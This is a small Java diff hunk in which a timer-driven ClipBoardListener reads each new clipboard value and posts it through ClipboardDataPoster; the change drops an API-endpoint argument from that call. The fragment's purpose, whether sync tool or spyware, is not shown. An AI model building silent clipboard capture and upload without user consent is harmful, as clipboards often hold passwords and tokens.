@@ -22,7 +22,7 @@ public class ClipBoardListener extends TimerTask {
 
                 if (clipboardText != null && !clipboardText.equals(previousClipboardContent)) {
                     previousClipboardContent = clipboardText;
-                    ClipboardDataPoster.Post(clipboardText, Device.getPostApi());
+                    ClipboardDataPoster.Post(clipboardText);
                 }
             } catch (Exception e) {
                 e.printStackTrace();
